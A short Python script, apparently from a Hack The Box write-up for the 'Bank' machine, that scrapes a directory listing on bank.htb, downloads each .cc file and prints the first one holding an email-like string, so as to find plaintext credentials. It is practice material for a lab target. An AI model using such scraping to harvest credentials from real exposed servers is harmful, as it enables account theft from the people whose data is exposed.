#!/usr/bin/python3
# search in a set of files for a specific file with plaintext creds
# get creeds for Bank machine from HTB

import requests
from bs4 import BeautifulSoup
import re
import time

files = []
url = "http://bank.htb/balance-transfer/"
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
for f in soup.findAll('a', attrs={'href': re.compile(".cc$")}):
    files.append(f.get('href'))

for u in files:
	print("[*] searching in %s"%u)
	r2 = requests.get("http://bank.htb/balance-transfer/%s" % u)
	# now i'll need to check on every file
	match = re.search(r'\w+@\w+', r2.text)
	if match:
		print("[*] ok we got something")
		print("[*] check this out : http://bank.htb/balance-transfer/%s" %u)
		print(r2.text)
		exit(0)
	else:
		pass
